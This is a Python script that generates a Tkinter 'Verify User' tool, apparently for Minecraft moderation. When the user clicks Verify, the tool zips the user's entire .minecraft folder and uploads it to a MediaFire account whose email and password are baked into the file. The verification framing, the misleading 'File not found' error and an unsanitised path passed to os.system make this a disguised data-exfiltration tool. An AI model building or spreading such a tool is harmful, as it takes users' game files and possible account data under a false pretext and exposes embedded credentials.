repertory = input('Please enter the repertory of .minecraft file. ')
file_ss = input('Please enter the file of ss-tool are be write. ')
mf_email = input('Please enter the email of your mediafire account. ')
mf_password = input('Please enter the password of your mediafire account. ')
with open(file_ss, 'w') as f:
    f.write("""
from mediafire.client import (MediaFireClient, File, Folder)
import os
from tkinter import *
window = Tk()
window.title("Verify User")
window.geometry("480x160")
window.resizable(False, False)
def valider():
    info.update()
    window.title("Sending File...")
    os.system(\'zip -r -q minecraft """ + repertory + """\')
    try:
        client = MediaFireClient()
        client.login(email= \'""" + mf_email + """\',
            password= \'""" + mf_password + """\',
            app_id='42511')
        client.upload_file("minecraft.zip", "mf:/client.zip")
        os.system('rm minecraft.zip')
        window.title("File Send !")
    except:
        window.title('Error : File not found')
        return
vide = Label(window, text="    ")
vide.grid(row=0, column=0)
mdpl = Label(window, text="In click on \\"Verify\\", you accept to send your .minecraft file to")
mdpl.grid(row=2, column=0)
mdpl = Label(window, text="a moderator")
mdpl.grid(row=3, column=0)
valid = Button(window, text="Verify", command=valider)
valid.grid(row=4, column=0)
info = Label(window, text=" ")
info.grid(row=4, column=1)
mainloop()
""")